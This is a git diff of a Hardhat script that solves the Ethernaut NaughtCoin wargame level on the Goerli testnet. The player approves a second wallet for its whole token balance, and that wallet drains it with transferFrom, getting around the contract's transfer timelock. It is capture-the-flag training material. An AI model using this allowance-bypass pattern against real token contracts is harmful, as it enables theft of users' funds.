@@ -2,7 +2,7 @@ import { ethers } from "hardhat";
 
 const approveNaughtCoin = async () => {
     // change naughtcoin instance address here
-    const naughtCoinAddress = "0x3a7425BC6e24Be643cBa3e830C1356091a42Abd3";
+    const naughtCoinAddress = "0xa7984ebEC87054409aA8Ca05E3fE00e826f1148B";
     // change your player and spender address in the .env file
     const player = process.env.PRIVATE_KEY || "";
     const spender = process.env.PRIVATE_KEY_2 || "";
@@ -16,31 +16,40 @@ const approveNaughtCoin = async () => {
     // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md
     // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol
 
+    // using my custom rpc stored in .env (for privacy)
+    // const provider = ethers.getDefaultProvider("goerli");
+    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
+    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
+    const players = new ethers.Wallet(player, provider);
+    const spenders = new ethers.Wallet(spender, provider);
+    console.log("Player's address is: ", players.address);
+    console.log("Spender's address is: ", spenders.address);
+
     // 1st part using player
     const IERC20 = await ethers.getContractAt("IERC20", naughtCoinAddress);
-    const IERC20Player = IERC20.connect(player);
-    let playerBalance = await IERC20Player.balanceOf(player);
-    let spenderBalance = await IERC20Player.balanceOf(spender);
+    const IERC20Player = IERC20.connect(players);
+    let playerBalance = await IERC20Player.balanceOf(players.address);
+    let spenderBalance = await IERC20Player.balanceOf(spenders.address);
     console.log(`Players Balance: ${playerBalance}`);
     console.log(`Spenders Balance: ${spenderBalance}`);
     console.log("Now approving Spender Address to spend Player's balance...");
-    const tx = await IERC20Player.approve(spender, playerBalance);
+    const tx = await IERC20.approve(spenders.address, playerBalance);
     const success = await tx.wait(1);
     console.log(success);
-    const amountApproved = (await IERC20Player.allowance(player, spender)).toString();
+    const amountApproved = (await IERC20.allowance(players.address, spenders.address)).toString();
     console.log(`Amount approved for transfer: ${amountApproved}`);
     // 2nd part using spender
     console.log("Spender will now transfer the balance to itself...");
-    const IERC20Spender = IERC20.connect(spender);
-    const tx2 = await IERC20Spender.transferFrom(player, spender, playerBalance);
+    const IERC20Spender = IERC20.connect(spenders);
+    const tx2 = await IERC20Spender.transferFrom(players.address, spenders.address, playerBalance);
     const receipttx2 = await tx2.wait(1);
     console.log(receipttx2);
     console.log("Rechecking balances...");
-    playerBalance = await IERC20Spender.balanceOf(player);
-    spenderBalance = await IERC20Spender.balanceOf(spender);
+    playerBalance = await IERC20Spender.balanceOf(players.address);
+    spenderBalance = await IERC20Spender.balanceOf(spenders.address);
     console.log(`Players Balance: ${playerBalance}`);
     console.log(`Spenders Balance: ${spenderBalance}`);
-    if (playerBalance === 0) {
+    if (playerBalance < 1) {
         console.log("Congrats! Player balance is now 0, submit to ethernaut");
     } else {
         console.log("Player balance is not 0, Please review code above and try again...");
